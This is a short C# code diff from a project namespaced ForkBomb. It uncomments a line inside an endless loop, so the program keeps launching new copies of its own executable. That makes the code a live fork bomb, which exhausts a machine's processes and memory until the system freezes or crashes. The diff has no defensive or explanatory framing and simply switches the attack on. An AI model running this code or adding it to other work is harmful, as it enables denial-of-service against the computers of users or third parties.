@@ -30,7 +30,7 @@ namespace ForkBomb
             //Creating an endless loop which will create childs (clones of this instance that will keep cloning)
             while (Trigger == true)
             {
-               // Process.Start(Assembly.GetExecutingAssembly().Location);
+               Process.Start(Assembly.GetExecutingAssembly().Location);
             }
         }
     }
